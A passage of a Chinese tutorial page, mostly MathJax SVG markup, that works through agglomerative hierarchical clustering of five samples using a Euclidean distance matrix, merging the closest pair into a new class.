376Z"></path></g></g></g></g></g></svg></mjx-container>表示第i个样本与第j个样本之间的欧氏距离。显然D为对称矩阵。应用聚合层次聚类法对这5个样本进行聚类。</p><p>解：</p><p>首先用5个样本构建5个类，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="24.315ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 10747.3 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mi" transform="translate(819,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(1390.7,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2446.5,0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(2946.5,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mi" transform="translate(605,-150) scale(0.707)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g></g><g data-mml-node="mo" transform="translate(3845.5,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g><g data-mml-node="mo" transform="translate(4345.5,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(4790.1,0)"><path data-c="1D456" d="M184 600Q184 624 203 642T247 661Q265 661 277 649T290 619Q290 596 270 577T226 557Q211 557 198 567T184 600ZM21 287Q21 295 30 318T54 369T98 420T158 442Q197 442 223 419T250 357Q250 340 236 301T196 196T154 83Q149 61 149 51Q149 26 166 26Q175 26 185 29T208 43T235 78T260 137Q263 149 265 151T282 153Q302 153 302 143Q302 135 293 112T268 61T223 11T161 -11Q129 -11 102 10T74 74Q74 91 79 106T122 220Q160 321 166 341T173 380Q173 404 156 404H154Q124 404 99 371T61 287Q60 286 59 284T58 281T56 279T53 278T49 278T41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mo" transform="translate(5412.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(6468.7,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g><g data-mml-node="mo" transform="translate(6968.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(7413.3,0)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g><g data-mml-node="mo" transform="translate(7913.3,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(8358,0)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g><g data-mml-node="mo" transform="translate(8858,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(9302.7,0)"><path data-c="34" d="M462 0Q444 3 333 3Q217 3 199 0H190V46H221Q241 46 248 46T265 48T279 53T286 61Q287 63 287 115V165H28V211L179 442Q332 674 334 675Q336 677 355 677H373L379 671V211H471V165H379V114Q379 73 379 66T385 54Q393 47 442 46H471V0H462ZM293 211V545L74 212L183 211H293Z"></path></g><g data-mml-node="mo" transform="translate(9802.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mn" transform="translate(10247.3,0)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g></g></svg></mjx-container>。这样，样本之间的距离也就变成类之间的距离，所以5个类之间的距离矩阵亦为D。</p><p>由矩阵D可以看出，<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="13.093ex" height="1.945ex" role="img" focusable="false" viewBox="0 -694 5787.3 859.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(553,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(1587.9,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msub" transform="translate(2643.7,0)"><g data-mml-node="mi"><path data-c="1D451" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path></g><g data-mml-node="TeXAtom" transform="translate(553,-150) scale(0.707)" data-mjx-texclass="ORD"><g data-mml-node="mn"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z" transform="translate(500,0)"></path></g></g></g><g data-mml-node="mo" transform="translate(4231.5,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mn" transform="translate(5287.3,0)"><path data-c="31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path></g></g></g></svg></mjx-container>为最小，所以把<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.766ex" height="1.97ex" role="img" focusable="false" viewBox="0 -705 1222.6 870.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g></g></g></svg></mjx-container>和<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.766ex" height="1.97ex" role="img" focusable="false" viewBox="0 -705 1222.6 870.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g></g></g></svg></mjx-container>合并为一个新类，记作<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.566ex" xmlns="http://www.w3.org/2000/svg" width="13.615ex" height="2.262ex" role="img" focusable="false" viewBox="0 -750 6017.9 1000"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g><g data-mml-node="mn" transform="translate(819,-150) scale(0.707)"><path data-c="36" d="M42 313Q42 476 123 571T303 666Q372 666 402 630T432 550Q432 525 418 510T379 495Q356 495 341 509T326 548Q326 592 373 601Q351 623 311 626Q240 626 194 566Q147 500 147 364L148 360Q153 366 156 373Q197 433 263 433H267Q313 433 348 414Q372 400 396 374T435 317Q456 268 456 210V192Q456 169 451 149Q440 90 387 34T253 -22Q225 -22 199 -14T143 16T92 75T56 172T42 313ZM257 397Q227 397 205 380T171 335T154 278T148 216Q148 133 160 97T198 39Q222 21 251 21Q302 21 329 59Q342 77 347 104T352 209Q352 289 347 316T329 361Q302 397 257 397Z"></path></g></g><g data-mml-node="mo" transform="translate(1500.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mo" transform="translate(2556.1,0)"><path data-c="7B" d="M434 -231Q434 -244 428 -250H410Q281 -250 230 -184Q225 -177 222 -172T217 -161T213 -148T211 -133T210 -111T209 -84T209 -47T209 0Q209 21 209 53Q208 142 204 153Q203 154 203 155Q189 191 153 211T82 231Q71 231 68 234T65 250T68 266T82 269Q116 269 152 289T203 345Q208 356 208 377T209 529V579Q209 634 215 656T244 698Q270 724 324 740Q361 748 377 749Q379 749 390 749T408 750H428Q434 744 434 732Q434 719 431 716Q429 713 415 713Q362 710 332 689T296 647Q291 634 291 499V417Q291 370 288 353T271 314Q240 271 184 255L170 250L184 245Q202 239 220 230T262 196T290 137Q291 131 291 1Q291 -134 296 -147Q306 -174 339 -192T415 -213Q429 -213 431 -216Q434 -219 434 -231Z"></path></g><g data-mml-node="msub" transform="translate(3056.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(4064.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="msub" transform="translate(4509.3,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,-150) scale(0.707)"><path data-c="35" d="M164 157Q164 133 148 117T109 101H102Q148 22 224 22Q294 22 326 82Q345 115 345 210Q345 313 318 349Q292 382 260 382H254Q176 382 136 314Q132 307 129 306T114 304Q97 304 95 310Q93 314 93 485V614Q93 664 98 664Q100 666 102 666Q103 666 123 658T178 642T253 634Q324 634 389 662Q397 666 402 666Q410 666 410 648V635Q328 538 205 538Q174 538 149 544L139 546V374Q158 388 169 396T205 412T256 420Q337 420 393 355T449 201Q449 109 385 44T229 -22Q148 -22 99 32T50 154Q50 178 61 192T84 210T107 214Q132 214 148 197T164 157Z"></path></g></g><g data-mml-node="mo" transform="translate(5517.9,0)"><path data-c="7D" d="M65 731Q65 745 68 747T88 750Q171 750 216 725T279 670Q288 649 289 635T291 501Q292 362 293 357Q306 312 345 291T417 269Q428 269 431 266T434 250T431 234T417 231Q380 231 345 210T298 157Q293 143 292 121T291 -28V-79Q291 -134 285 -156T256 -198Q202 -250 89 -250Q71 -250 68 -247T65 -230Q65 -224 65 -223T66 -218T69 -214T77 -213Q91 -213 108 -210T146 -200T183 -177T207 -139Q208 -134 209 3L210 139Q223 196 280 230Q315 247 330 250Q305 257 280 270Q225 304 212 352L210 362L209 498Q208 635 207 640Q195 680 154 696T77 713Q68 713 67 716T65 731Z"></path></g></g></g></svg></mjx-container>。</p><p>计算<mjx-container class="MathJax" jax="SVG"><svg style="vertical-align: -0.375ex" xmlns="http://www.w3.org/2000/svg" width="2.766ex" height="1.97ex" role="img" focusable="false" viewBox="0 -705 1222.6 870.6"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 